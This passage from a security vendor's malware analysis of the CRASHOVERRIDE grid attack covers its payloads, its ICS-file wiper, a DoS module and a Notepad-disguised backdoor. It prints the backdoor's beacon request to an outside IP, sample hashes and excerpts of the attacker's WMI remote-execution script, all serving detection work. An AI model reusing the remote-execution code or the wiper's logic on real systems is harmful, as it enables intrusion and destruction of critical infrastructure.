Payload: OPC + 61850\n\nELECTRUM deployed a binary, named\n“imapi.dll”, that combines functionality for both\nthe 61850 and OPC modules detailed above. As\ndisplayed in Figure 10, the “Crash” export\ncreates two threads in sequence: the first for a\nroutine duplicating OPC module functionality,\nthe second essentially replicating the 61850\nmodules.\n\nOf note, this slightly more complex sample\nfeatures a later execution time for effects\ndelivery than others observed thus far: 20\nDecember 2016 0630 UTC. This corresponds to\nthe “second round” of attacks after the initial\ntiming of around midnight 17 December 2016.\nWhile this may seem a follow-on attack,\ncompilation timestamps preserved as debug\ndirectory artifacts indicate that imapi was\ncompiled before the initial outages and was _Figure 10: IMAPI Sequential Thread Creation_\ntherefore a pre-planned attack to occur at a\nlater time. One possibility, based on the functionality of the two protocols, is that the paired attack is\ndesigned to overcome environmental fail-safes: notably, switchgear refusing to open if circuit breakers\nare not open to prevent arc. Combining the two payloads allows for OPC to target breakers (and potentially\nswitchgear as well) while 61850 impacts switchgear. Combined, this would overcome operational failsafes to deliver an electric distribution impact.\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n14\n\n\n-----\n\n#### Wiper Module\n\nThe destructive or “wiper” module represents the last stage of the CRASHOVERRIDE attack. Following a\ntwo-hour timer (in samples available for analysis), the launcher executable again looks for the exported\n“Crash” function, but this time in a separate, hard-coded file that must be co-located in the specified\nworking directory, “haslo.dat”.\n\nThe wiper consists of three stages:\n\n1. Overwrite system service registry entries to null values to render system unbootable.\n\n2. Remove files relating to ICS operations to impede recovery and system restoration.\n\n3. Terminate system processes to cause a crash and system shutdown.\n\nFirst, the wiper moves to make the system unbootable by manipulating services listed in the following\nregistry hive:\n\n```\nSYSTEM\\CurrentControlSet\\Services\n\n```\n\nFor each system service, the image path is cleared. On system restart, the machine will be unable to load\nsystem services, resulting in a failure to boot the OS.[16]\n\nNext, the wiper enumerates the infected machine for all drives C-Z except “V:\\”. The wiper then looks for\nvarious generic file formats (e.g., “.exe”, “.zip”, “.tar”) as well as files with the following more specific\nextensions for deletion:\n\n#### File/Extension Assessed Purpose\nSYS_BASCOM.COM ABB SYS600 Base System Configuration File\n*.pcmp ABB PCM600 Project File\n*.pcmi ABB PCM600 IEC File\n*.pcmt ABB PCM600 Template IED File\n*.pl Programmable Logic File (Vendor Neutral)\n*paf PLC Archive File (Vendor Neutral)\n*.scl Substation Configuration Language (IEC-61850)\n*.cid Configured IED Description\n*.scd Substation Configuration Description (IEC-61850)\n*.xrf Cross Reference File used in ABB MicroSCADA\n*.v Possibly AutoCAD\n*.trc Trace File Type Specified in OPC DA\n*.cin ABB MicroSCADA Specific File\n*.ini MicroSCADA Documentation Uses INI Files Extensively\n*.prj ABB Control Builder\n*.mdf Database Format\n*.ldf Database Format\n\n16 In some respects, this behavior is functionally (in terms of outcome) equivalent to the service wiping function\nused in the OlympicDestroyer event (see Olympic Destroyer – Talos\n\n[https://blog.talosintelligence.com/2018/02/olympic-destroyer.html]). However, the two are implemented\ndifferently, thus not indicating any definitive link between the entities responsible.\n\n|extensions for deletion:|Col2|\n|---|---|\n|File/Extension|Assessed Purpose|\n|SYS_BASCOM.COM|ABB SYS600 Base System Configuration File|\n|*.pcmp|ABB PCM600 Project File|\n|*.pcmi|ABB PCM600 IEC File|\n|*.pcmt|ABB PCM600 Template IED File|\n|*.pl|Programmable Logic File (Vendor Neutral)|\n|*paf|PLC Archive File (Vendor Neutral)|\n|*.scl|Substation Configuration Language (IEC-61850)|\n|*.cid|Configured IED Description|\n|*.scd|Substation Configuration Description (IEC-61850)|\n|*.xrf|Cross Reference File used in ABB MicroSCADA|\n|*.v|Possibly AutoCAD|\n|*.trc|Trace File Type Specified in OPC DA|\n|*.cin|ABB MicroSCADA Specific File|\n|*.ini|MicroSCADA Documentation Uses INI Files Extensively|\n|*.prj|ABB Control Builder|\n|*.mdf|Database Format|\n|*.ldf|Database Format|\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n15\n\n\n-----\n\n|*.bak|ABB SYS600 Project Files use BAK for Backup Files|\n|---|---|\n\n\n_Table 1: Targeted File Extensions_\n\nOverall, the filetypes referenced are for ABB equipment, specifically the ABB MicroSCADA product line.[17]\nEssentially, the wiper looks to eliminate files relating to grid operations to inhibit service restoration and\nrecovery based on previously-saved, known-good configurations.\n\nFinally, the wiper proceeds to terminate system processes to force a system crash:\n\n```\ntaskhost.exe\nwininit.exe\nwinlogon.exe\nwuauclt.exe\n\n```\n```\naudiodg.exe\nconhost.exe\ncsrss.exe\ndwm.exe\nexplorer.exe\nlsass.exe\n\n```\n```\nlsm.exe\nservices.exe\nshutdown.exe\nsmss.exe\nspoolss.exe\nspoolsv.exe\nsvchost.exe\n\n```\n\nAt this stage, the impacted system – a device sitting “one hop” away from the target ICS equipment for\nthe specified impact module – is shutdown, with immediate system restoration impossible without\nrecourse to boot disks and non-standard manipulation of the impacted host. Furthermore, unless backups\nof relevant files are kept elsewhere in the network, precise ICS and SCADA service restoration is\nimpossible due to the loss of configuration files.\n\n### Primary Backdoor Module\n\nESET and initial Dragos reporting all identified a primary backdoor initiating events for the\nCRASHOVERRIDE attack. As indicated above, subsequent analysis based on newly-available data from\nthe event indicates that this backdoor was not necessary for CRASHOVERRIDE and based on recovered\nforensic artifacts may not have been used to execute the attacks.\n\nAdmittedly, even with a far greater corpus of data than what was available in June 2017 – when\nCRASHOVERRIDE was first publicly disclosed – there remain gaps, therefore it is possible other aspects\nof the attack relied on this custom backdoor. Nonetheless, a review of operations and software\nfunctionality indicate that this component – which is also the component most resembling traditional\nmalware and easiest to detect via traditional security measures – is not a necessary component for\nexecuting a CRASHOVERRIDE-like event.\n\nAs this module has already received extensive coverage and analysis in other publications – namely\nESET’s Industroyer analysis and Dragos’ CRASHOVERRIDE white paper – this will not receive further\nexamination in this space.\n\n### Impeding Recovery\n\nIn addition to the wiper module described previously, ELECTRUM also deployed a denial of service\ncapability leveraging a previously disclosed and patched vulnerability in Siemens SIPROTEC equipment,\n\n17 MicroSCADA Pro – ABB (https://new.abb.com/network-management/network-management/microscada-pro)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n16\n\n\n-----\n\nCVE-2015-5374.[18] The vulnerability was patched in 2015, still relatively soon for device patching in ICS\nenvironments considering the attack took place in late 2016. The SIPROTEC device itself plays supporting\nand enabling roles in IEC-61850 communications and SCADA control, making it a potentially effective\ntarget to further disrupt operations during the attack by inhibiting operator control.\n\nUnfortunately, in designing this software, appropriately named “dos.exe”, the attacker successfully\nimplemented the specially-crafted traffic to UDP 50000 that would trigger a denial of service condition\nbut failed in implementing byte conversion for IP addresses when creating sockets. As a result, the module\nsends traffic to invalid, incorrect IP addresses. For example, if targeting 192.1.2.3, the created socket\nwould send traffic to 3.2.1.192.\n\nAs implemented, the “dos.exe” module includes a hard-coded list of IP addresses for attack. As a result,\neven if this error is caught at run-time, the adversary could not “fudge” execution by reading in a modified\nlist of “reversed” IP addresses. Thus this module is effectively useless for the attack.\n\n### Alternate Backdoor\n\nFinally, an additional backdoor component was discovered in the intrusion and originally noted by ESET\nin mid-2017. The backdoor itself is a modified copy of Windows Notepad. Within the environment, the file\n– based on exif and metadata – appears to be a legitimate, albeit older, copy of Notepad:\n```\n   File Size            : 72 kB\n   File Type            : Win32 EXE\n   File Type Extension       : exe\n   MIME Type            : application/octet-stream\n   Machine Type          : Intel 386 or later, and compatibles\n   Time Stamp           : 2008:04:13 12:35:51-06:00\n   PE Type             : PE32\n   Subsystem            : Windows GUI\n   File OS             : Windows NT 32-bit\n   Object File Type        : Executable application\n   Language Code          : English (U.S.)\n   Company Name          : Microsoft Corporation\n   File Description        : Notepad\n   File Version          : 5.1.2600.5512 (xpsp.080413-2105)\n   Internal Name          : Notepad\n   Legal Copyright         : © Microsoft Corporation. All rights\n   reserved.\n   Original File Name       : NOTEPAD.EXE\n   Product Name          : Microsoft® Windows® Operating System\n   Product Version         : 5.1.2600.5512\n\n```\n18 Siemens SIPROTEC Denial-of-Service Vulnerability – ICS-CERT\n(https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n17\n\n\n-----\n\nHowever, a review of plaintext strings immediately indicates something altered in the file. In addition to\nobfuscated program sections, the following observables appear:\n```\n   RegisterPenApp\n   notepad.chm\n   hhctrl.ocx\n   CLSID\\{ADB880A6-D8FF-11CF-9377-00AA003B7A11}\\InprocServer32\n\n```\nFurther research identifies samples exhibiting these static characteristics from January 2016 (nearly a\nyear before CRASHOVERRIDE) to the present. The programs themselves all launch a call-out to a hardcoded, but obfuscated, network address. Unfortunately, the exact purpose of this callout is not completely\nclear at present. The observed traffic is likely a call-out beacon to initiate connection back to the executing\nhost.\n\nSeveral examples are evident in CRASHOVERRIDE data. One sample, named “csvd.exe”, produces the\nfollowing call-out:\n```\n   GET /8C7SW HTTP/1.1\n   Cache-Control: no-cache\n   Connection: Keep-Alive\n   Pragma: no-cache\n   Host: 188.42.253.43:8820\n\n```\nOther examples recovered “in the wild” include beacons to private addresses, public addresses with a\ndestination port of TCP 4444 (potentially indicative of a Meterpreter payload), and other variations. At\npresent, lacking complete traffic flows and additional context, this item remains somewhat mysterious in\nterms of ultimate, complete functionality.\n\nThe IP address in question is unremarkable, belonging to a Singapore-based hosting provider with no\nassociated domains. This is potentially adversary-owned infrastructure but more likely represents\nlegitimate network space compromised by the adversary for first-hop communications.\n\nAt present it is not certain if this tool represents an ELECTRUM-exclusive item or the repurposing of a\ncommon backdoor by the group for the CRASHOVERRIDE attack. Work on this item continues.\n\n## Context and Mitigation\n\n##### ELECTRUM’s CRASHOVERRIDE attack represents both a sophisticated event (in terms of designing ICS-specific malicious payloads) and an example of fairly standard intrusion activities such as “living off the land”.\n\nReviewing the entirety of the CRASHOVERRIDE event – from initial intrusion through ICS-focused physical\nimpact – several interesting items emerge:\n\n  - Except for the final ICS-focused payloads, almost no malware was used in the attack. The primary\nbackdoor mechanism, discussed earlier, may not have even been used based on available\ninformation, and other malicious software variants represent publicly-available frameworks such\nas Mimikatz.\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n18\n\n\n-----\n\n  - Network intrusion, information gathering, and pivoting all relied on credential capture and reuse\nand leveraging legitimate system tools for execution.\n\n  - The timeframe of the overall intrusion is measured in months, but the shift to ICS impacts took\nplace in a matter of weeks beginning in mid-December, potentially fueled by earlier\nreconnaissance.\n\nBased on all of the above items, ELECTRUM’s CRASHOVERRIDE attack represents both a sophisticated\nevent (in terms of designing ICS-specific malicious payloads) and an example of fairly standard intrusion\nactivities such as “living off the land”.[19] This mixed set of capabilities – from relatively advanced to\ncommodity, “pentester 101” – reveal an interesting aspect of ELECTRUM and ICS intrusion events in\ngeneral: while the ultimate impact scenario generally requires some specialized knowledge, actual\nnetwork intrusion requires no especially advanced set of skills.\n\nFrom a detection and response standpoint, especially when considered across the kill chain (see Figure 2\nin Background), identifying seemingly “commodity” tactics within the context of the ICS environment is\nincredibly valuable. Typical binary defense focuses on antivirus – yet antivirus is largely designed to\ncapture items that corrupt or subvert local or remote Windows processes and not programs designed to\ndeliver _ICS_ impacts. In the case of CRASHOVERRIDE, the only aspects that would fall under typical\nantivirus detection are the Mimikatz variant and the “primary” backdoor (which prior analysis indicates is\nnot even a necessary component for the attack). Instead, identifying authentication information within the\nnetwork, binary movement between IT and ICS and within ICS, and system alterations on critical hosts\ncontrolling ICS equipment all would serve to detect – and form the foundation for mitigating – a\nCRASHOVERRIDE-type attack. Essentially, defenders need to tune detections and response from ITcentric approaches to ICS-specific capabilities, including capturing malicious behaviors – such as the\nrampant authentication and remote process activity exhibited by ELECTRUM – indicative of a “malwareless” compromise event.\n\nUnfortunately, the state of the modern ICS environment typically lacks the level of visibility – definitely on\nhost, but also to a certain extent in network – that would allow such actions to be identified and tracked.\nOnly by increasing visibility then orienting detection and monitoring toward adversary behaviors will ICS\ndefenders be able to effectively protect against the next CRASHOVERRIDE attack. Given the peculiars of\nICS intrusions – from “living off the land” for standard Windows system compromise to bespoke ICS\nmalware for ultimate effects – traditional, Windows-centric security solutions may not be the answer.\nInstead, ICS owners and operators will need to embrace the challenge provided by groups such as\nELECTRUM and learn their environment, increase visibility, and determine at what point the merely\n“anomalous” becomes malicious.\n\nIn this fashion, defenders can defend not merely against a CRASHOVERRIDE variant, but against entire\nclasses of malicious activity. By focusing on necessary adversary actions – such as credential capture\nand binary movement for final effects – defenders can create necessary traffic and detection “choke\npoints” to monitor for and respond to such required activities. While this will not be easy, such a robust\napproach represents the only sure means of securing the ICS environment moving forward.\n\n19 Although used elsewhere, a term best explained in Symantec’s “Living Off the Land and Fileless Attack\nTechniques” (https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-livingoff-the-land-and-fileless-attack-techniques-en.pdf)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n19\n\n\n-----\n\n## APPENDICES\n\n### APPENDIX A – List of Sample Hashes\n\nThe following list includes recovered sample hashes from CRASHOVERRIDE, including binaries and\nscripts.\n\n|Name|SHA256|Function|\n|---|---|---|\n|101_copy.bat|a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98|Runs ufn.vbs and sqlc.vbs, Copies 101 Payloads to Specified Hosts|\n|104.bat|07d5d5ba8cd17efab2ebf3b76cb6b61825249518c11c3910ceb6473e0efb3deb|Runs sqlc.vbs, Configures ImapiService|\n|104.dll|7907dd95c1d36cf3dc842a1bd804f0db511a0f68f4b3d382c23a3c974a383cad|104 Effects Module|\n|104_copy.bat|693c631f1673bd61135080e9b4759342c5835d20231f6f4f7b55117fda111e4f|Runs ufn.vbs and sqlc.vbs, Copies 104 Payloads to Specified Hosts|\n|104_copy.bat|a95f6d43e62a5cfb4e95667df9b04d07b60d103b36f4cff12c07e7c2dab88a98|Runs ufn.vbs and sqlc.vbs, Copies 104 Payloads to Specified Hosts|\n|61850.dll|4e7d2b269088c1575a31668d86de95fd3dde6caa88051d7ec110f7f150058789|61850 Effects Module - DLL Variant|\n|61850.exe|55e7471ad841bd8a110818760ea89af3bb456493f0798a54ce3b8e7b790afd0a|61850 Effects Module - EXE Variant|\n|alg.exe|3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571|Primary Backdoor|\n|avtask.exe|37d54e3d5e8b838f366b9c202f75fa264611a12444e62ae759c31a0d041aa6e4|Primary Backdoor|\n|avtask.exe|7e96849c69263e0125419a3fbb2547050329b7189db599d8136650171818bd81|Primary Backdoor|\n|avtask2.exe|41658472df4074a0a2a2298ba3f17e0b17112fed99e495bf34dac138d6f7b247|Primary Backdoor|\n|c.exe|502402f8568359645d50f1d6e58ab927f05702f6220b60767897b3912b761b99|Primary Backdoor|\n|csvd.exe|f6e62b1d75d91171ab30e8985189ea5aacd947c887222fdb58acbc2db2542f64|Backdoor NOTEPAD Variant|\n|csvf.exe|767b078645baef34cfb366a41df8fe65bcce597c2bc9c08cae063d287f7a8011|Backdoor NOTEPAD Variant|\n|csvnpr.exe|9860c3d30233c7f1c6631caefa2b6632a01b2b729909bc0dd894c5b418b4eb1b|Backdoor NOTEPAD Variant|\n|defragsvc.exe|21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561|Launcher Module|\n|dos.exe|4587ccfecc9a1ff5c5538a3475409ca1687d304bcde252077a119c436296857b|Siemens SIPROTEC DoS Module|\n|ep.exe|3ca252fb405c83cceea25041c3f1c01bead8f1afe0144f8cdee795bb868a903d|Primary Backdoor|\n|haslo.dat|018eb62e174efdcdb3af011d34b0bf2284ed1a803718fba6edffe5bc0b446b81|Destructive Module|\n|haslo.exe|ad23c7930dae02de1ea3c6836091b5fb3c62a89bf2bcfb83b4b39ede15904910|Destructive Module|\n|ilaunchr.exe|c57e390d4c1ba116a28fe618d407395d261f25c2901d1fe68f420fb47a26f444|Primary Backdoor|\n|imapi.dll|12ba9887d3007b0a0713d9f1973e1176bd33eccb017b5a7dba166c7c172151e9|Hybrid 61850 and OPC Effects Module|\n|imapi.exe|56ae7705ffcd56e74e5aecb0e43f17d510c2eaaddc7356f991c0db1daf32a641|Hybrid 61850 and OPC Effects Module Launcher|\n|ImapiService.exe|7cc9ac6383437dd96161b93b017500a22a2c8d05f58778b9b9fce8ea73304546|Launcher Module|\n|ld.exe|13a71a050d20aaad43ef78d771f22d636475b2ef8e4918731ff64d162287c480|UPX- Packed Credential Dumper Using Extensive Mimikatz Source Code|\n|mm.exe|286c63d24fe9259bb6a758ce86e48c7f9094304ce4a32054641923a8cb4eab3c|UPX- Packed Mimikatz|\n|npadpr.exe|376c0608820598f2f20666a82e1d801fce347233e2051010fbcf43c8278220dc|Backdoor NOTEPAD Variant|\n|opc.exe|156bd34d713d0c8419a5da040b3c2dd48c4c6b00d8a47698e412db16b1ffac0f|Stand- Alone Module|\n|pa.vbs|fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26|System Recon|\n|rm.vbs|fb5bbea0f1acfcf123979e4c615d54474c4f079276ee3828f5b8613bb3bbdf26|System Recon|\n|swprv.exe|dcb7d2fc46f61d5522e005ac66f3f0661e2d5284d5a3f8b3a0c8b4050d8397a7|Variant of Primary Backdoor|\n|tiering.exe|9a12493af09b0711edb0d6797fb195c64f3ca65437dd6274b171ebd22558172c|Backdoor NOTEPAD Variant|\n|tiersvc.exe|ecaf150e087ddff0ec6463c92f7f6cca23cc4fd30fe34c10b3cb7c2a6d135c77|Primary Backdoor|\n|ws.exe|6d707e647427f1ff4a7a9420188a8831f433ad8c5325dc8b8cc6fc5e7f1f6f47|Primary Backdoor|\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n20\n\n\n-----\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n21\n\n\n-----\n\n### APPENDIX B – Remote Execution and Survey Script\n\nAs the script is lengthy, the below are selections from the file “remote.vbs” to show the most relevant\nportions of the script:\n```\n   On Error Resume Next\n   Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n   Set WshNetwork = WScript.CreateObject(\"WScript.Network\")\n   Set FSO = WScript.CreateObject(\"Scripting.FileSystemObject\")\n   Dim objSWbemLocator\n   Dim objSWbemServices\n   <BREAK>\n   Function RunRemoteProcess(Command)\n    Set objStartup = objSWbemServices.Get(\"Win32_ProcessStartup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = 0\n     Set objProcess = objSWbemServices.Get(\"Win32_Process\")\n    strCmd = \"cmd.exe /c \" & Command & \" >> \" & GetReportFile()\n     intReturn = objProcess.Create(strCmd, Null, objConfig, intProcessID)\n    If intReturn <> 0 Then\n     Wscript.Echo \"Process could not be created.\" & _\n       vbNewLine & \"Command line: \" & strCmd & _\n       vbNewLine & \"Return value: \" & intReturn\n        RunRemoteProcess = 2\n        Exit Function\n    End If\n    Set WaitProcesses = objSWbemServices.ExecNotificationQuery(\"Select * From\n   __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process'\")\n    Do Until i = 1\n        Set objLatestProcess = WaitProcesses.NextEvent\n        If objLatestProcess.TargetInstance.ProcessID = intProcessID Then\n            i = 1\n        End If\n    Loop\n    RunRemoteProcess = 0\n   End Function\n   <BREAK>\n   Function ConnectToServer(RemoteMachine, Username, Password)\n    Set objSWbemLocator = CreateObject(\"WbemScripting.SWbemLocator\")\n     Set objSWbemServices = objSWbemLocator.ConnectServer(RemoteMachine,\n   \"root\\CIMV2\", Username, Password)\n     If Err.Number <> 0 Then\n       Wscript.StdOut.Write \"Error: \" & Err.Description\n        ConnectToServer = 1\n\n```\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n22\n\n\n-----\n\n```\n        Exit Function\n     End If\n    ConnectToServer = 0\n    Set colItems = objSWbemServices.ExecQuery(\"Select * From\n   Win32_OperatingSystem\")\n    For Each objItem in colItems\n        Header = vbNullString\n        Header = Header & objItem.Caption & objItem.CSDVersion & vbCrLF\n        Header = Header & \"CodeSet: \" & objItem.CodeSet & vbCrLF\n    Next\n    Wscript.StdOut.Write Header\n   End Function\n\n```\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n23\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf"
    ],
    "report_names": [
        "CRASHOVERRIDE2018.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1539369518,
    "ts_modification_date": 1539369518,
    "files": {
        "pdf": "https://archive.orkl.eu/a25ec7842d099723e923b84475074c8f75894a7b.pdf",
        "text": "https://archive.orkl.eu/a25ec7842d099723e923b84475074c8f75894a7b.txt",
        "img": "https://archive.orkl.eu/a25ec7842d099723e923b84475074c8f75894a7b.jpg"
    }
}